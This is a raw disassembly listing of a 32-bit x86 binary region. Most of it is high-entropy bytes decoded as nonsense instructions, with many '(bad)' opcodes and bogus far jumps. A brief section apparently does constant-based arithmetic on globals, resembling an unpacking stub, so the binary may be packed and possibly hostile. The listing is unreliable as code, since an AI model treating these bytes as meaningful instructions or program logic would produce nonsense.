  4096e7:	sbb    al,0x96
  4096e9:	popa   
  4096ea:	pusha  
  4096eb:	aas    
  4096ec:	(bad)  
  4096ed:	cmp    al,0x80
  4096ef:	sub    BYTE PTR es:[esi-0x4d17f254],bh
  4096f6:	mov    DWORD PTR [esi+0x79],edi
  4096f9:	aaa    
  4096fa:	cld    
  4096fb:	adc    bh,ah
  4096fd:	imul   edi,ecx,0xf93f54e5
  409703:	jmp    0xb4a3:0xae660305
  40970a:	push   ss
  40970b:	ss push esp
  40970d:	ds push esi
  40970f:	(bad)  
  409710:	jnp    0x40970f
  409712:	add    DWORD PTR [eax-0x68bb52ee],ecx
  409718:	test   eax,0x113f5aab
  40971d:	retf   0xd577
  409720:	cmp    eax,0xd38ccffb
  409725:	lods   eax,DWORD PTR fs:[esi]
  409727:	jmp    0x939f:0x79e34d7d
  40972e:	scas   al,BYTE PTR es:[edi]
  40972f:	cmp    ch,BYTE PTR [ebp+0xe]
  409732:	std    
  409733:	call   0xdbdd:0x39f9f468
  40973a:	inc    ebp
  40973b:	es sbb eax,0x3f590ce2
  409741:	xchg   esp,eax
  409742:	out    0x25,eax
  409744:	inc    ebp
  409745:	js     0x409738
  409747:	push   ss
  409748:	cs sbb cl,dl
  40974b:	sub    DWORD PTR [esi+0x51b4cbb3],ebp
  409751:	fcmovnbe st,st(4)
  409753:	and    al,0xe5
  409755:	jp     0x40975c
  409757:	in     al,dx
  409758:	(bad)  
  409759:	fdiv   QWORD PTR [ebx+eiz*2+0x5d]
  40975d:	inc    ebp
  40975e:	pop    ss
  40975f:	inc    esi
  409760:	das    
  409761:	sub    edx,DWORD PTR [ebx+0x2b9a6468]
  409767:	xchg   DWORD PTR [ecx-0x57],ebp
  40976a:	push   cs
  40976b:	fstp   QWORD PTR [ebx-0x5d2e22ff]
  409771:	pusha  
  409772:	in     eax,0xcc
  409774:	dec    ecx
  409775:	retf   
  409776:	cmc    
  409777:	xchg   esi,eax
  409778:	add    eax,0x57c938ee
  40977d:	imul   edi,DWORD PTR [ecx],0x86a13d65
  409783:	dec    eax
  409784:	sahf   
  409785:	int3   
  409786:	fs sub eax,0x334e4f2
  40978c:	shl    ecx,cl
  40978e:	pop    ebp
  40978f:	and    dl,BYTE PTR [esi]
  409791:	sbb    eax,0xcc541ba6
  409796:	js     0x409789
  409798:	sti    
  409799:	imul   edi,DWORD PTR [ebp+ebx*1+0x4bf830e4],0xffffffa4
  4097a1:	aas    
  4097a2:	jmp    0xd1d7:0xb1bb88dc
  4097a9:	pop    eax
  4097aa:	(bad)  
  4097ab:	mov    BYTE PTR [esi],dh
  4097ad:	adc    esi,DWORD PTR [esi-0x7b69d185]
  4097b3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4097b5:	es push ss
  4097b7:	sub    dl,al
  4097b9:	cmp    BYTE PTR [ebx],ch
  4097bb:	js     0x4097b1
  4097bd:	scas   al,BYTE PTR es:[edi]
  4097be:	ins    DWORD PTR es:[edi],dx
  4097bf:	jmp    0xce2:0x9a9df722
  4097c6:	das    
  4097c7:	push   esi
  4097c8:	and    ebp,edi
  4097ca:	pop    DWORD PTR [edx+0x1801cbd2]
  4097d0:	adc    bh,bl
  4097d2:	std    
  4097d3:	retf   
  4097d4:	mov    al,ds:0xbed11b04
  4097d9:	(bad)  
  4097da:	jnp    0x4097a4
  4097dc:	pusha  
  4097dd:	stos   BYTE PTR es:[edi],al
  4097de:	imul   esi,ecx,0xd
  4097e1:	jo     0x409819
  4097e3:	mov    ebp,DWORD PTR [ebx+edi*8-0x3c]
  4097e7:	or     eax,0x7cfe2dc1
  4097ec:	adc    BYTE PTR [esi],ch
  4097ee:	xor    bl,BYTE PTR [esi]
  4097f0:	mov    cl,0x92
  4097f2:	cmp    eax,0xdb8f3f87
  4097f7:	arpl   WORD PTR [esi+esi*8-0x50e188f1],dx
  4097fe:	dec    ecx
  4097ff:	test   al,0x7c
  409801:	in     al,dx
  409802:	aad    0xdf
  409804:	xchg   ebp,eax
  409805:	ffree  st(7)
  409807:	outs   dx,BYTE PTR ds:[esi]
  409808:	dec    ecx
  409809:	add    eax,0x3ce7fb90
  40980e:	jno    0x409843
  409810:	mov    bh,0x7
  409812:	or     eax,0xba539bdb
  409817:	xor    DWORD PTR ds:0xb035fe3e,eax
  40981d:	inc    ebp
  40981e:	sbb    al,BYTE PTR [esi+edi*8-0x58]
  409822:	sbb    al,0xb4
  409824:	test   al,0xdd
  409826:	lock dec esp
  409828:	in     al,0x80
  40982a:	pushf  
  40982b:	cmp    al,0x10
  40982d:	rcl    ebx,0x4e
  409830:	rol    ch,1
  409832:	sti    
  409833:	cwde   
  409834:	or     esp,DWORD PTR [eax-0x3b]
  409837:	ss mov ch,al
  40983a:	push   esp
  40983b:	or     DWORD PTR [esi],eax
  40983d:	bound  edi,QWORD PTR [ebp-0x51]
  409840:	inc    ecx
  409841:	repz cli 
  409843:	frstor [eax]
  409845:	mov    ?,WORD PTR [ecx]
  409847:	fldl2e 
  409849:	iret   
  40984a:	rcr    dh,cl
  40984c:	pop    esp
  40984d:	std    
  40984e:	shr    BYTE PTR [edi+esi*1],cl
  409851:	js     0x409864
  409853:	stos   DWORD PTR es:[edi],eax
  409854:	or     ebp,DWORD PTR [ebx]
  409856:	inc    esi
  409857:	mov    al,ds:0xa4abd6b7
  40985c:	das    
  40985d:	sbb    cl,cl
  40985f:	fiadd  WORD PTR [ebx]
  409861:	fld    QWORD PTR [ebx+0xb]
  409864:	test   BYTE PTR [ebp-0x14d89e18],ah
  40986a:	ins    BYTE PTR es:[edi],dx
  40986b:	mov    ebx,0x2b4e159b
  409870:	test   DWORD PTR [eax+0x3f31da50],esp
  409876:	jns    0x40983a
  409878:	push   eax
  409879:	sar    eax,1
  40987b:	(bad)  
  40987c:	and    ecx,DWORD PTR [edx]
  40987e:	pop    ecx
  40987f:	jb     0x409898
  409881:	push   ds
  409882:	jl     0x4098d0
  409884:	shr    BYTE PTR [edx+0x1b49a27a],1
  40988a:	fcom   st(1)
  40988c:	pushf  
  40988d:	(bad)  
  40988e:	arpl   di,bp
  409890:	xchg   edx,eax
  409891:	mov    dl,0x23
  409893:	fisttp QWORD PTR [eax-0x6afe7905]
  409899:	in     eax,dx
  40989a:	(bad)  
  40989b:	div    DWORD PTR [edi+0x70]
  40989e:	es mov ecx,0x1e351d96
  4098a4:	mov    edx,0xd1b5a40d
  4098a9:	shr    DWORD PTR [edx+ebp*8],cl
  4098ac:	pop    ecx
  4098ad:	sbb    bh,0x65
  4098b0:	jmp    0x1166:0x10defd26
  4098b7:	jmp    DWORD PTR [edi-0x2a]
  4098ba:	push   ebp
  4098bb:	outs   dx,BYTE PTR ds:[esi]
  4098bc:	call   0x8b975c8e
  4098c1:	add    eax,0xd76c79ff
  4098c6:	xchg   edi,eax
  4098c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098c8:	cwde   
  4098c9:	sub    eax,0x1ae4ff84
  4098ce:	mov    edx,0xddae9d97
  4098d3:	fstp   DWORD PTR [eax]
  4098d5:	or     BYTE PTR [edi-0x6b],dl
  4098d8:	sub    DWORD PTR [edi-0x30aeff52],0x54142af2
  4098e2:	cmp    dh,BYTE PTR [eax]
  4098e4:	mov    eax,ds:0xd3ed24c8
  4098e9:	inc    edi
  4098ea:	lea    esi,[ebx]
  4098ec:	outs   dx,BYTE PTR ds:[esi]
  4098ed:	mov    es,WORD PTR [esi]
  4098ef:	pop    eax
  4098f0:	out    dx,al
  4098f1:	sar    BYTE PTR [ebx-0x4c],1
  4098f4:	std    
  4098f5:	(bad)  
  4098f6:	and    DWORD PTR [eax-0x68fa6bd7],esi
  4098fc:	jns    0x409911
  4098fe:	mov    bh,0x6
  409900:	jle    0x4098c3
  409902:	mov    ecx,0x2429c015
  409907:	popa   
  409908:	mov    ds:0x4c695033,al
  40990d:	fdiv   QWORD PTR [edx+0x32]
  409910:	cmp    DWORD PTR [ebx+ebp*1-0x5f],eax
  409914:	mov    bh,0x6d
  409916:	xchg   ebp,eax
  409917:	mov    ch,0xd
  409919:	xchg   esi,eax
  40991a:	xchg   edi,eax
  40991b:	xchg   ebx,eax
  40991c:	icebp  
  40991d:	inc    edi
  40991e:	(bad)  
  40991f:	out    dx,al
  409920:	ins    BYTE PTR es:[edi],dx
  409921:	sbb    DWORD PTR [eax+0x58],ebx
  409924:	stos   DWORD PTR es:[edi],eax
  409925:	int    0x2b
  409927:	std    
  409928:	pop    ebp
  409929:	das    
  40992a:	jnp    0x409981
  40992c:	xchg   ebp,eax
  40992d:	sub    ebp,ebx
  40992f:	arpl   WORD PTR [ecx],cx
  409931:	cmp    al,0x35
  409933:	or     eax,0x2005ebcb
  409938:	jae    0x409901
  40993a:	jle    0x40991f
  40993c:	cwde   
  40993d:	aad    0x98
  40993f:	mov    eax,ds:0xad848589
  409944:	leave  
  409945:	mov    ebx,0xc5d85195
  40994a:	or     ebx,DWORD PTR [ebx+0x53]
  40994d:	mov    ebp,DWORD PTR [ebp-0x24]
  409950:	xchg   edx,eax
  409951:	sub    DWORD PTR [ebx],0x43cdd3aa
  409957:	xchg   ebx,eax
  409958:	push   sp
  40995a:	cmp    al,0x73
  40995c:	enter  0x7b6a,0xb0
  409960:	push   ebp
  409961:	or     BYTE PTR [esi],al
  409963:	std    
  409964:	in     al,dx
  409965:	fcmovbe st,st(5)
  409967:	dec    ebx
  409968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409969:	call   0x170:0x63c3233b
  409970:	push   esp
  409971:	das    
  409972:	mov    ch,0xe9
  409974:	out    dx,eax
  409975:	aas    
  409976:	and    esp,DWORD PTR [eax-0xf6445c9]
  40997c:	jo     0x409996
  40997e:	lods   al,BYTE PTR ds:[esi]
  40997f:	and    DWORD PTR ss:[ebx],0x723dbd28
  409986:	mov    ah,0x47
  409989:	cmp    DWORD PTR ds:0x46cd53cc,esp
  40998f:	push   esp
  409990:	and    BYTE PTR [ebx],dl
  409992:	dec    esp
  409993:	dec    eax
  409994:	cli    
  409995:	jge    0x40998f
  409997:	into   
  409998:	pusha  
  409999:	mov    cl,0x93
  40999b:	jmp    0x409a10
  40999d:	cld    
  40999e:	sbb    DWORD PTR ds:[eax+0x17deb6ab],esi
  4099a5:	and    eax,0x2651cafc
  4099aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ab:	cmovg  edx,DWORD PTR [edx+edx*2+0x6bf6382a]
  4099b3:	outs   dx,DWORD PTR ds:[esi]
  4099b4:	pop    ebp
  4099b5:	(bad)  
  4099b6:	sti    
  4099b7:	stos   DWORD PTR es:[edi],eax
  4099b8:	ins    DWORD PTR es:[edi],dx
  4099b9:	das    
  4099ba:	pop    ecx
  4099bb:	stc    
  4099bc:	ins    DWORD PTR es:[edi],dx
  4099bd:	shr    bl,0x3c
  4099c0:	mov    bl,0xcd
  4099c2:	xlat   BYTE PTR ds:[ebx]
  4099c3:	aad    0x67
  4099c5:	pusha  
  4099c6:	xchg   DWORD PTR [esi+0x55139ca2],esp
  4099cc:	sbb    DWORD PTR [eax+0x25],0xffffff8a
  4099d0:	inc    edx
  4099d1:	adc    eax,0xc639cc1a
  4099d6:	add    ah,BYTE PTR [ecx+0x64]
  4099d9:	std    
  4099da:	mov    fs,WORD PTR [esi+esi*2]
  4099dd:	jnp    0x409a00
  4099df:	adc    ecx,DWORD PTR [edx]
  4099e1:	daa    
  4099e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099e3:	add    ah,bl
  4099e5:	popf   
  4099e6:	jae    0x409a43
  4099e8:	sub    DWORD PTR [ebx-0x49],esp
  4099eb:	repnz cmp eax,0xf0622c78
  4099f1:	lahf   
  4099f2:	pop    esi
  4099f3:	(bad)  
  4099f5:	aas    
  4099f6:	push   es
  4099f7:	pushf  
  4099f8:	and    bl,cl
  4099fa:	popa   
  4099fb:	inc    si
  4099fd:	fs xor al,0xd7
  409a00:	retf   0xfde9
  409a03:	fstp   QWORD PTR ds:[ebx+0x13]
  409a07:	mov    eax,ds:0x8583ea63
  409a0c:	mov    al,0xa0
  409a0e:	retf   0x3ad
  409a11:	loopne 0x409a2c
  409a13:	jmp    0x9e3db53c
  409a18:	xor    BYTE PTR [eax-0x26d15c08],dh
  409a1e:	mov    ah,BYTE PTR [ebx+0x13]
  409a21:	popa   
  409a22:	or     eax,0xf305e537
  409a27:	outs   dx,DWORD PTR ds:[esi]
  409a28:	fs mov eax,0x41fa239d
  409a2e:	sbb    BYTE PTR [edi-0xe],dl
  409a31:	or     dl,BYTE PTR [eax-0x154e5c7b]
  409a37:	pop    es
  409a38:	push   edi
  409a39:	stos   DWORD PTR es:[edi],eax
  409a3a:	aam    0xf6
  409a3c:	mov    ecx,0x59c70b9d
  409a41:	cld    
  409a42:	inc    edx
  409a43:	xor    bh,bh
  409a45:	rol    ah,0x86
  409a48:	bound  ebp,QWORD PTR [edi-0x3e]
  409a4b:	sub    al,0x3a
  409a4d:	and    DWORD PTR [eax+eiz*8-0x74],ebx
  409a51:	cmp    eax,0xcd0a34a3
  409a56:	mov    edx,0x17717996
  409a5b:	inc    ebx
  409a5c:	int    0xdf
  409a5e:	scas   al,BYTE PTR es:[edi]
  409a5f:	or     DWORD PTR [edx-0x364f54f0],edi
  409a65:	cs lahf 
  409a67:	sbb    DWORD PTR ds:0x59ef6c1,esp
  409a6d:	lahf   
  409a6e:	adc    al,0xf1
  409a70:	lods   al,BYTE PTR ds:[esi]
  409a71:	jnp    0x409acc
  409a73:	pop    ds
  409a74:	pop    ebx
  409a75:	sahf   
  409a76:	mov    al,ds:0x79720eab
  409a7b:	das    
  409a7c:	pop    ebp
  409a7d:	(bad)  
  409a7e:	cli    
  409a7f:	push   eax
  409a80:	fdivr  st(6),st
  409a82:	pusha  
  409a83:	imul   ebx,DWORD PTR [edi+0x1c708b21],0x25
  409a8a:	cdq    
  409a8b:	jns    0x409b06
  409a8d:	lahf   
  409a8e:	ds data16 js 0x409acc
  409a92:	and    eax,0xa172d060
  409a97:	das    
  409a98:	out    dx,eax
  409a99:	sub    BYTE PTR [esi+esi*4-0x4e],0x17
  409a9e:	arpl   WORD PTR [edx-0x6a],cx
  409aa1:	in     al,0xb0
  409aa3:	repnz aam 0xf0
  409aa6:	int    0x35
  409aa8:	test   BYTE PTR [edi],ah
  409aaa:	into   
  409aab:	lods   al,BYTE PTR ds:[esi]
  409aac:	ror    BYTE PTR [eax],0x55
  409aaf:	(bad)  
  409ab0:	mov    ebp,0xb822eb58
  409ab5:	(bad)  
  409ab6:	fxch   st(6)
  409ab8:	push   esi
  409ab9:	mov    ecx,DWORD PTR ds:0x422008
  409abf:	add    ecx,DWORD PTR ds:0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b91
  409b48:	ret    
  409b49:	xor    dl,bl
  409b4b:	cmp    DWORD PTR [edx+edi*2],eax
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	int    0x72
  409b55:	mov    ds:0xec4650dc,eax
  409b5a:	mov    dl,bl
  409b5c:	pop    ss
  409b5d:	sar    bl,0x10
  409b60:	popa   
  409b61:	pop    edi
  409b62:	rcr    BYTE PTR [eax-0x5c],0x2b
  409b66:	stos   BYTE PTR es:[edi],al
  409b67:	nop
  409b68:	ins    BYTE PTR es:[edi],dx
  409b69:	sar    esp,cl
  409b6b:	pop    eax
  409b6c:	add    ebp,DWORD PTR [ecx]
  409b6e:	jmp    0x234b6f42
  409b73:	retf   
  409b74:	stos   BYTE PTR es:[edi],al
  409b75:	(bad)  
  409b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b77:	cmp    dl,al
  409b79:	sti    
  409b7a:	dec    ebx
  409b7b:	sub    DWORD PTR [esi*1-0x43e985e0],esi
  409b82:	or     esp,eax
  409b84:	inc    ebx
  409b85:	or     al,al
  409b87:	mov    dl,bl
  409b89:	pop    ebx
  409b8a:	sub    BYTE PTR [eax-0x12c255c4],0x6a
  409b91:	pop    es
  409b92:	out    dx,al
  409b93:	std    
  409b94:	or     al,dl
  409b96:	jecxz  0x409b8a
  409b98:	push   ebp
  409b99:	jecxz  0x409bbc
  409b9b:	stc    
  409b9c:	in     eax,0x14
  409b9e:	mov    esi,0xe4165898
  409ba3:	lock dec BYTE PTR [ebp-0x6e8b6a6b]
  409baa:	sahf   
  409bab:	inc    edi
  409bac:	lea    ebp,[edi-0x56b6d274]
  409bb2:	and    eax,0x800c4433
  409bb7:	push   ebp
  409bb8:	sbb    al,0x9
  409bba:	ja     0x409bd3
  409bbc:	mov    ?,WORD PTR [esi-0x4b6ab88e]
  409bc2:	test   dh,bh
  409bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bc5:	mov    ebx,0xf9f61e9c
  409bca:	cmp    eax,DWORD PTR [eax+0x34d29c5c]
  409bd0:	jl     0x409c04
  409bd2:	inc    edx
  409bd3:	imul   ebp,DWORD PTR [edi-0x3a621874],0x693f1f27
  409bdd:	pop    ecx
  409bde:	int    0x2
  409be0:	ror    BYTE PTR [edx+eax*2-0x18],0x3f
  409be5:	mov    ch,0xd8
  409be7:	and    edx,edx
  409be9:	(bad)  
  409bea:	call   0xc819ed7c
  409bef:	in     al,dx
  409bf0:	mov    ebp,0xb8c78717
  409bf5:	call   0x7302c5e3
  409bfa:	mov    edx,0x66f15bd2
  409bff:	jg     0x409c53
  409c01:	call   0xe318756c
  409c06:	stos   DWORD PTR es:[edi],eax
  409c07:	clc    
  409c08:	push   0xffffff84
  409c0a:	ins    DWORD PTR es:[edi],dx
  409c0b:	bound  eax,QWORD PTR [eax+esi*1]
  409c0e:	std    
  409c0f:	lods   al,BYTE PTR ds:[esi]
  409c10:	hlt    
  409c11:	mov    ?,WORD PTR [ebp-0x677d6770]
  409c17:	xchg   ebx,eax
  409c18:	pop    ebx
  409c19:	or     eax,0x7a755550
  409c1e:	in     eax,dx
  409c1f:	cmc    
  409c20:	sahf   
  409c21:	sub    DWORD PTR [ecx+ebp*2+0x42],0x58
  409c26:	lock out 0xf9,al
  409c29:	add    edi,DWORD PTR [esi+0x50ed348d]
  409c2f:	dec    esp
  409c30:	jmp    0x89b17573
  409c35:	int3   
  409c36:	sub    BYTE PTR [ebx+0xd],dl
  409c39:	dec    ebp
  409c3a:	dec    esi
  409c3b:	and    eax,0xe40f0e1d
  409c40:	imul   esp,DWORD PTR [ebp+ebp*8-0x69de618f],0xe0246624
  409c4b:	shl    edx,cl
  409c4d:	stc    
  409c4e:	xchg   ecx,eax
  409c4f:	dec    esp
  409c50:	in     eax,dx
  409c51:	mov    edx,0x3954ce08
  409c56:	dec    edx
  409c57:	fcmovb st,st(4)
  409c59:	arpl   WORD PTR [ebp-0x466a5c6c],cx
  409c5f:	clc    
  409c60:	lock dec ecx
  409c62:	jecxz  0x409c6e
  409c64:	mov    BYTE PTR [ebp-0x10],cl
  409c67:	daa    
  409c68:	jae    0x409cb2
  409c6a:	dec    eax
  409c6b:	or     BYTE PTR [eax-0x32],dl
  409c6e:	es loope 0x409c80
  409c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c72:	loope  0x409c3c
  409c74:	mov    esi,0xec2a6e34
  409c79:	rcl    BYTE PTR [esi-0x52],0x7e
  409c7d:	mov    bh,0x5b
  409c7f:	sbb    BYTE PTR [eax-0x4],ah
  409c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c83:	inc    esi
  409c84:	and    BYTE PTR [ecx+0x1e34a22f],0x52
  409c8b:	ret    
  409c8c:	dec    edx
  409c8d:	xor    al,0xe2
  409c8f:	jbe    0x409cf0
  409c91:	fiadd  WORD PTR [ebx]
  409c93:	test   eax,edi
  409c95:	les    ebp,FWORD PTR [eax]
  409c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c98:	cdq    
  409c99:	mov    ebp,0x52a1dc2
  409c9e:	not    DWORD PTR [ebp+0x313ac123]
  409ca4:	lock inc edi
  409ca6:	(bad)  
  409ca7:	in     al,dx
  409ca8:	lods   al,BYTE PTR ds:[esi]
  409ca9:	jno    0x409c9e
  409cab:	adc    BYTE PTR ds:0x82dd1cd0,al
  409cb1:	into   
  409cb2:	fidivr DWORD PTR [esi+0x6b9b50e0]
  409cb8:	sti    
  409cb9:	mov    dl,0xc4
  409cbb:	in     eax,dx
  409cbc:	test   eax,0x99cc58f
  409cc1:	mov    ebp,0x389562f6
  409cc6:	xlat   BYTE PTR ds:[ebx]
  409cc7:	sub    al,BYTE PTR [esi]
  409cc9:	dec    ecx
  409cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ccb:	call   0x879e:0x9e93c5aa
  409cd2:	cmp    DWORD PTR [ebx-0x1729a1e],0x5ee25ccc
  409cdc:	cli    
  409cdd:	push   ecx
  409cde:	sbb    esp,ebp
  409ce0:	gs (bad) 
  409ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce3:	inc    eax
  409ce4:	xor    ah,BYTE PTR [esp+edi*1+0x5]
  409ce8:	sbb    DWORD PTR [edx+0x6d],0x350cd8ad
  409cef:	in     al,0xd2
  409cf1:	dec    BYTE PTR [esi]
  409cf3:	push   esp
  409cf4:	sub    BYTE PTR [ebx-0x80],bl
  409cf7:	mov    eax,ds:0x74626100
  409cfc:	loope  0x409d51
  409cfe:	fwait
  409cff:	stos   DWORD PTR es:[edi],eax
  409d00:	inc    ebx
  409d01:	and    al,0xf
  409d03:	dec    ecx
  409d04:	or     al,0xfb
  409d06:	imul   esi,edi,0xffffff95
  409d09:	pop    edx
  409d0a:	sbb    ax,0xa6f5
  409d0e:	mov    ds:0x4db3a3d8,al
  409d13:	in     al,0x69
  409d15:	mov    cl,0x8e
  409d17:	aam    0x25
  409d19:	adc    ebp,0x1f
  409d1c:	sub    ah,BYTE PTR [ebx-0x30055d2c]
  409d22:	inc    eax
  409d23:	mov    ebp,0xbd6b4222
  409d28:	mov    esi,0xf237f687
  409d2d:	stc    
  409d2e:	push   ds
  409d2f:	mov    BYTE PTR [ebp-0x20],cl
  409d32:	es js  0x409d3c
  409d35:	stos   BYTE PTR es:[edi],al
  409d36:	mov    al,0xd2
  409d38:	stos   BYTE PTR es:[edi],al
  409d39:	xor    dl,ah
  409d3b:	jle    0x409ccb
  409d3d:	adc    BYTE PTR [ebp+0x66],0xd2
  409d41:	inc    eax
  409d42:	adc    DWORD PTR [ebp+0x1c930960],edx
  409d48:	dec    esi
  409d49:	(bad)  
  409d4a:	pop    ebp
  409d4b:	sar    ecx,cl
  409d4d:	call   0x19094d6a
  409d52:	es iret 
  409d54:	test   BYTE PTR [eax+eiz*1-0x3c],bl
  409d58:	mov    ebp,DWORD PTR [edx+0x1a]
  409d5b:	das    
  409d5c:	xchg   esp,eax
  409d5d:	in     al,0x8b
  409d5f:	punpcklwd mm0,DWORD PTR [ebp+0x5d7dbc29]
  409d66:	retf   
  409d67:	sub    al,0x15
  409d69:	mov    bh,0x3c
  409d6b:	jmp    0xd3fd2d81
  409d70:	push   eax
  409d71:	pusha  
  409d72:	mov    ds:0x6a5605b2,al
  409d77:	and    ch,ch
  409d79:	cs adc eax,edx
  409d7c:	add    BYTE PTR ds:0x71ab8195,al
  409d82:	or     ebp,DWORD PTR [ebp-0x7d]
  409d85:	push   es
  409d86:	and    BYTE PTR [edx-0x3d],dl
  409d89:	mov    dl,0xa6
  409d8b:	push   ebx
  409d8c:	push   cs
  409d8d:	inc    edi
  409d8e:	neg    DWORD PTR [ebp+0x4beacb46]
  409d94:	and    BYTE PTR [edi-0x17],bh
  409d97:	test   DWORD PTR [ecx+0x3b],edx
  409d9a:	(bad)  
  409d9b:	jae    0x409e17
  409d9d:	mov    ecx,0x436559
  409da2:	mov    edi,0x8f632ad9
  409da7:	inc    esp
  409da8:	dec    esp
  409da9:	add    DWORD PTR es:[ecx-0x62],0x34863773
  409db1:	xchg   edi,eax
  409db2:	dec    ebp
  409db3:	sub    eax,DWORD PTR [edx+0x5bb432fa]
  409db9:	leave  
  409dba:	(bad)  
  409dbb:	(bad)  
  409dbc:	xor    ah,BYTE PTR [ebp-0x21dfff69]
  409dc2:	imul   eax,DWORD PTR [ecx],0xffffffd0
  409dc5:	push   ds
  409dc6:	test   DWORD PTR [esi+0x460ae887],edi
  409dcc:	aas    
  409dcd:	push   eax
  409dce:	ja     0x409d67
  409dd0:	in     eax,0x75
  409dd2:	dec    ecx
  409dd3:	mov    dh,0xf7
  409dd5:	mov    bh,0x7f
  409dd7:	add    BYTE PTR [eax],0x44
  409dda:	lods   eax,DWORD PTR ds:[esi]
  409ddb:	mov    ebp,edx
  409ddd:	cmp    al,0xc2
  409ddf:	imul   DWORD PTR [ebx]
  409de1:	inc    esp
  409de2:	mov    ah,BYTE PTR [esi-0x4e]
  409de5:	out    0xa4,al
  409de7:	test   DWORD PTR [eax+0x32c10378],esp
  409ded:	shr    BYTE PTR [ebx],0xf3
  409df0:	(bad)  
  409df1:	sti    
  409df2:	add    DWORD PTR [ebx],eax
  409df4:	imul   eax,DWORD PTR ds:0xb6f03669,0xffffffc8
  409dfb:	stos   DWORD PTR es:[edi],eax
  409dfc:	loop   0x409e02
  409dfe:	or     eax,0x2f307772
  409e03:	and    al,0xf4
  409e05:	xchg   ebp,eax
  409e06:	mov    dh,0x96
  409e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e09:	and    ah,bh
  409e0b:	ror    BYTE PTR gs:[ebp-0x1],1
  409e0f:	loop   0x409db0
  409e11:	call   0xbb8001b5
  409e16:	mov    ecx,0x62c0ccee
  409e1b:	xchg   ebx,edi
  409e1d:	ds scas al,BYTE PTR es:[edi]
  409e1f:	(bad)  
  409e20:	in     al,0x8
  409e22:	fsub   DWORD PTR [esi+0x6497b40c]
  409e28:	xchg   ebx,eax
  409e29:	fistp  DWORD PTR [eax-0x43]
  409e2c:	sub    al,0xb9
  409e2e:	call   0x6854697b
  409e33:	xor    cl,BYTE PTR [ebp+ecx*2+0x342fe2da]
  409e3a:	into   
  409e3b:	push   DWORD PTR [ebx+0x26]
  409e3e:	and    ebp,0x15
  409e41:	mov    eax,ds:0xeebb0ec9
  409e46:	ss dec ecx
  409e48:	cmovp  ecx,DWORD PTR [edi+0x60]
  409e4c:	inc    eax
  409e4d:	retf   
  409e4e:	lea    ebx,[ebp-0xb]
  409e51:	jb     0x409e9c
  409e53:	and    bh,BYTE PTR ds:[esi]
  409e56:	mov    ebp,0x141823c5
  409e5b:	shl    BYTE PTR [edx-0x61],0x4f
  409e5f:	lods   eax,DWORD PTR ds:[esi]
  409e60:	inc    edi
  409e61:	das    
  409e62:	inc    ebp
  409e63:	push   0x50
  409e65:	add    edi,DWORD PTR [eax-0x75]
  409e68:	or     ebx,ebp
  409e6a:	in     al,dx
  409e6b:	rol    DWORD PTR [edi+ecx*1+0xa],1
  409e6f:	cmp    BYTE PTR [esi+0x8e270b7],0x3c
  409e76:	repz dec ecx
  409e78:	inc    edx
  409e79:	ins    BYTE PTR es:[edi],dx
  409e7a:	mov    ds:0xaba95dd3,eax
  409e7f:	or     eax,DWORD PTR [eax+0xfa4b630]
  409e85:	push   0x33f3789f
  409e8a:	mov    ds,eax
  409e8c:	or     BYTE PTR [edi+0x11a21b2b],0xf0
  409e93:	mov    dl,0xbb
  409e95:	push   ds
  409e96:	outs   dx,DWORD PTR ds:[esi]
  409e97:	cmp    al,0x7f
  409e99:	dec    eax
  409e9a:	dec    esi
  409e9b:	retf   
  409e9c:	push   eax
  409e9d:	adc    BYTE PTR [eax+0x29eb3981],ch
  409ea3:	aas    
  409ea4:	push   eax
  409ea5:	fs adc eax,0x9cbe2f2d
  409eab:	stos   DWORD PTR es:[edi],eax
  409eac:	in     eax,0x35
  409eae:	xchg   edi,eax
  409eaf:	dec    edx
  409eb0:	xor    cl,ch
  409eb2:	add    al,0x9e
  409eb4:	repz shl BYTE PTR [ebx+0x64235e70],1
  409ebb:	or     dl,BYTE PTR [eax+0x195a686e]
  409ec1:	das    
  409ec2:	por    mm5,mm2
  409ec5:	push   esp
  409ec6:	arpl   WORD PTR [ebx-0x7ec4c085],si
